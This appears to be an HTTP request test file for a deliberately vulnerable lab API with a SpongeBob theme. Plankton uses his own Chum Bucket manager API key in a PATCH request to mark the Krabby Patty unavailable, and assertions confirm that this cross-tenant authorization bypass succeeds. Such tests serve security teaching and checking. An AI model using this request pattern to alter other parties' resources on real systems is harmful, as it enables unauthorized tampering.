# @import ../common/setup.http
@base = {{base_host}}/v303

### Plankton checks that the Krabby Patty is available
# @name menu_before
GET {{base}}/menu

{{
  const item = menu_before.response.body.find(i => i.item_id == 1);
  exports.is_available = item.available;
}}

### Plankton uses his Chum Bucket manager key to disable the Krabby Patty
# @name exploit
PATCH {{base}}/menu/1
X-API-Key: {{chum_bucket_api_key}}
Content-Type: application/json

{
  "available": false
}

?? status == 200

### The Krabby Patty is now unavailable
GET {{base}}/menu
?? js response.body.find(i => i.item_id == 1).available == false
